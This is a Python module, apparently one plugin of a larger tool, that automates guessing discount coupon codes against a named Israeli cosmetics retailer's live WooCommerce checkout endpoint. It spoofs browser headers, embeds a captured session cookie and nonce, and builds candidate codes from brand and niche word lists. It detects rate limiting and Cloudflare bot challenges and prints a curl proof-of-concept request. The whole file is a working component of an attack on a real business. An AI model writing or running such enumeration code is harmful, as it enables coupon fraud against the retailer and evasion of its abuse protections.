import re
from models import TriageStatus
from strategies.base import BaseRetailerStrategy, clean_html, LI_REGEX


class SabonMichalStrategy(BaseRetailerStrategy):
    """Strategy implementation for Sabon Michal (WooCommerce HTML AJAX endpoint)."""

    @property
    def name(self) -> str:
        return "sabonmichal"

    @property
    def display_name(self) -> str:
        return "Sabon Michal"

    @property
    def target_url(self) -> str:
        return "https://sabonmichal.co.il/?wc-ajax=apply_coupon"

    @property
    def headers(self) -> dict[str, str]:
        return {
            "accept": "text/html, */*; q=0.01",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://sabonmichal.co.il",
            "priority": "u=1, i",
            "referer": "https://sabonmichal.co.il/cart/",
            "sec-ch-ua": '"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"macOS"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

    @property
    def default_cookies(self) -> dict[str, str]:
        return {
            "woocommerce_items_in_cart": "1",
            "woocommerce_cart_hash": "2c83ec39260e030c46bed1f2daa437b7",
            "wp_woocommerce_session_d4186335f7d9c1d6f737d7e970de3170": (
                "t_8645294434361f9ead3ca2a35bd8de|1791479448|1791393048|$generic$QcZKa5fsPqV2-BYRShEBEI-SLT1GwkyrxhwT8OaR"
            ),
        }

    @property
    def default_nonce(self) -> str:
        return "53c147013d"

    @property
    def baseline_candidates(self) -> list[str]:
        # erokdas is a known invalid code
        return ["erokdas"]

    def build_payload(self, coupon: str, nonce: str) -> dict[str, str]:
        return {
            "security": nonce,
            "coupon_code": coupon,
        }

    def triage_response(self, text: str, status_code: int) -> tuple[bool, str, str]:
        if status_code == 429:
            return False, TriageStatus.RATE_LIMITED, "HTTP 429 Too Many Requests (Rate limit hit)"

        if status_code == 403:
            if text.strip() == "-1":
                return False, TriageStatus.EXPIRED_NONCE, "Security nonce or session cookie expired (HTTP 403 / -1)"
            if "cf-mitigated" in text or "challenge-running" in text or "Cloudflare" in text or "Just a moment" in text:
                return False, TriageStatus.WAF_CHALLENGE, "Cloudflare WAF challenge triggered"
            return False, TriageStatus.EXPIRED_NONCE, f"HTTP 403 Forbidden: {text[:80]}"

        if "woocommerce-message" in text:
            match = re.search(r'class="[^"]*woocommerce-message[^"]*"[^>]*>(.*?)</div>', text, re.DOTALL)
            msg = clean_html(match.group(1)) if match else "קוד הקופון הוחל בהצלחה."
            return True, TriageStatus.APPLIED, msg

        if "woocommerce-error" in text:
            li_match = LI_REGEX.search(text)
            raw_msg = li_match.group(1) if li_match else text
            msg = clean_html(raw_msg)

            if any(kw in msg for kw in ["לא קיים", "אינו קיים", "לא תקין"]) or "does not exist" in msg.lower():
                return False, TriageStatus.INVALID, msg

            if any(kw in msg for kw in ["כבר הוחל", "כבר נוסף"]) or "already applied" in msg.lower():
                return True, TriageStatus.ALREADY_APPLIED, msg

            return True, TriageStatus.RESTRICTED, f"Exists (conditional): {msg}"

        return False, TriageStatus.INVALID, f"Unknown response ({status_code}): {clean_html(text[:100])}"

    def get_brand_tokens(self) -> tuple[list[str], list[str]]:
        brand_en = ["sabonmichal", "sabon", "michal", "sabon-michal"]
        brand_he = ["סבוןמיכל", "סבון מיכל", "סבון", "מיכל"]
        return brand_en, brand_he

    def get_dedicated_seeds(self) -> list[str]:
        return [
            "sabon", "michal", "sabon10", "michal10", "sabonmichal10",
            "welcome", "welcome10", "first10", "vip10"
        ]

    def get_niche_keywords(self) -> list[str]:
        # Cosmetics, soap, skincare, natural
        return [
            "soap", "skin", "care", "natural", "organic", "cosmetics", "beauty", "face", "body",
            "סבון", "טיפוח", "טבעי", "אורגני", "קוסמטיקה", "יופי", "פנים", "גוף"
        ]

    def get_curl_poc(self, coupon: str, nonce: str) -> str:
        return f"curl -s -X POST '{self.target_url}' -d 'security={nonce}&coupon_code={coupon}'"
